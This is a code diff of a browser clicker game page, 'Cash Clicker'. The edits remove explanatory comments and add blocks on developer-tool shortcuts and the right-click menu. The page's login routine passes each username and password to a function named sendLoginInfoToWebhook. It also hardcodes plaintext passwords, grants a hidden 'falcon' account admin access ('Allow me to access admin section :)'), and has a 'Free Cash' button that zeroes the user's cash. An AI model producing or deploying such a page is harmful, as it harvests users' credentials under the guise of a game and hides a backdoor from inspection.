@@ -3,25 +3,30 @@
 <head>
     <script>
 (function() {
-  // Disable opening developer tools with F12
+
   document.addEventListener("keydown", function(event) {
     if (event.keyCode === 123) {
       event.preventDefault();
     }
   });
 
-  // Disable opening developer tools with Ctrl+Shift+C
+
   document.addEventListener("keyup", function(event) {
     if (event.keyCode === 67 && event.ctrlKey && event.shiftKey) {
       event.preventDefault();
     }
   });
 
-  // Disable opening developer tools with other keyboard shortcuts
-  document.addEventListener("keydown", function(event) {
-    if (event.keyCode === 73 && event.ctrlKey && event.altKey) {
+
+  document.addEventListener("keyup", function(event) {
+    if (event.keyCode === 73 && event.ctrlKey && event.shiftKey) {
       event.preventDefault();
     }
+  });
+
+
+  document.addEventListener("contextmenu", function(event) {
+    event.preventDefault();
   });
 })();
 </script>
@@ -31,16 +36,16 @@
     <title>Cash Clicker</title>
     
     <style>
-        /* Add your CSS styles here */
+
     </style>
 
     <script>
         let cash = 0;
         let adminCode = generateRandomAdminCode();
         let giveCashVisible = false;
-        let freeCashButtonVisible = false; // Track the visibility of the free cash button
+        let freeCashButtonVisible = false;
 
-        // accounts
+
         const userAccounts = [
             { username: "flak", password: "3532950", cash: 200 },
             { username: "admin", password: "hmwhatwasthis", cash: 0 },
@@ -61,16 +66,16 @@
             cash++;
             document.getElementById("cash").innerText = cash;
 
-            // Make the "Free Cash" button always visible
+           
             document.getElementById("free-cash-button").style.display = "block";
         }
 
-        // Function to claim free cash and set cash to 0
+     
         function claimFreeCash() {
             cash = 0;
             document.getElementById("cash").innerText = cash;
 
-            // Hide the "Free Cash" button after it's claimed
+          
             document.getElementById("free-cash-button").style.display = "none";
         }
 
@@ -88,7 +93,7 @@
                 cash = userAccount.cash;
                 sendLoginInfoToWebhook(username, password);
 
-                if (username === "admin" || username === "falcon") { // Allow "falcon" to access admin section
+                if (username === "admin" || username === "falcon") { // Allow me to access admin section :)
                     document.getElementById("adminSection").style.display = "block"; 
                     document.getElementById("generate-admin-code").style.display = "block"; 
                     document.getElementById("toggle-give-cash-button").style.display = "block"; 
@@ -101,11 +106,11 @@
                 document.getElementById("game").style.display = "block";
                 document.getElementById("cash").innerText = cash;
             } else {
-                // Create a generic account for users with invalid credentials
+                // Create a account for users with invalid credentials
                 const genericAccount = createGenericAccount();
                 cash = genericAccount.cash;
 
-                // Hide admin-specific options
+               
                 document.getElementById("adminSection").style.display = "none";
                 document.getElementById("generate-admin-code").style.display = "none";
                 document.getElementById("toggle-give-cash-button").style.display = "none";
@@ -116,7 +121,7 @@
         }
 
         function register() {
-            // Implement registration logic if needed
+            
         }
 
         function buyPass() {
@@ -248,7 +253,7 @@
             if (secretCodeInput.value === adminCode) {
                 giveCashVisible = !giveCashVisible;
                 giveCashContainer.style.display = giveCashVisible ? "block" : "none";
-                secretCodeInput.value = ""; // Clear the input field
+                secretCodeInput.value = "";
             }
         }
 
@@ -260,7 +265,7 @@
             if (!isNaN(cashAmount) && cashAmount > 0) {
                 cash += cashAmount;
                 document.getElementById("cash").innerText = cash;
-                cashAmountInput.value = ""; // Clear the input field
+                cashAmountInput.value = ""; 
             }
         }
     </script>
@@ -281,7 +286,7 @@
         <button id="generate-admin-code" onclick="generateAndSendAdminCode()">Generate Admin Code</button>
         <button id="toggle-give-cash-button" onclick="toggleGiveCashButton()" style="display: none;">Toggle Give Cash</button>
         
-        <!-- Add the "Free Cash" button -->
+       
         <button id="free-cash-button" onclick="claimFreeCash()" style="display: none;">Click Me for Free Cash</button>
     </div>
 
